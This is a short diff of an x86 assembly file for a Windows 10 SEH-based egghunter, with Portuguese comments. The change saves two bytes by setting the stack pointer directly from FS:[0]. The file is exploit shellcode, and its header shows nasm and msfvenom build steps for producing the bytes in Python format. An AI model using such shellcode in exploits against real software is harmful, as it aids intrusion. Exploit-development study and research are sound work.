@@ -16,7 +16,7 @@
 ; nasm egghunter_w10.asm -o egghunter_w10
 ; cat egghunter_w10 | msfvenom -p - -a x86 --platform win -e generic/none -f python
 ;
-; 77 bytes egghunter
+; 75 bytes egghunter
 
 [BITS 32]
 
@@ -34,9 +34,7 @@ stack_align:
                                 ; Realinha a pilha de forma que o SEH que serta criado
                                 ; esteja junto com a cadeia SEH atual
     XOR EBX,EBX
-    MOV EAX, DWORD [FS:EBX]
-    PUSH EAX
-    POP ESP
+    MOV ESP, DWORD [FS:EBX]
 
     ;cria nosso registro SEH
     PUSH ECX                    ; salva na pilha o local onde nosso 'custom' SE Handler estara
